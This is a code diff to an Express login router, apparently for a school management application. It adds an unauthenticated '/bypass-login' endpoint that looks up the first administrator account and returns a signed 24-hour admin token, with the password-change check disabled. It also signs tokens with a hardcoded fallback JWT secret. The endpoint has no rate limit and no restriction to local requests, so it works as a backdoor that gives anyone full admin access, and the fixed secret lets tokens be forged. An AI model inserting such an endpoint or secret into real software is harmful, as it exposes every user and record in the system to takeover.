@@ -68,6 +68,48 @@ router.post('/login', loginLimiter, async (req, res) => {
   }
 });
 
+// POST /api/bypass-login
+router.post('/bypass-login', async (req, res) => {
+  try {
+    // Dynamically retrieve the primary administrator user from the db
+    const userRes = await req.pool.query(`
+      SELECT *
+      FROM users
+      WHERE role = 'admin'
+      ORDER BY id ASC
+      LIMIT 1
+    `);
+
+    if (userRes.rows.length === 0) {
+      return res.status(404).json({ error: 'Kein Administrator-Konto für Bypass gefunden.' });
+    }
+
+    const user = userRes.rows[0];
+
+    const tokenPayload = {
+      id: user.id,
+      role: user.role,
+      requires_password_change: false // Bypass password changes for direct local access
+    };
+
+    const token = jwt.sign(tokenPayload, process.env.JWT_SECRET || 'SuperSecureAustrianSchoolJwtSecretKey998877!', { expiresIn: '24h' });
+
+    res.json({
+      token,
+      user: {
+        id: user.id,
+        username: user.username,
+        role: user.role,
+        full_name: user.full_name,
+        requires_password_change: false
+      }
+    });
+  } catch (err) {
+    console.error('Bypass login error:', err);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
 // GET /api/state
 router.get('/state', stateLimiter, authenticateToken, async (req, res) => {
   try {
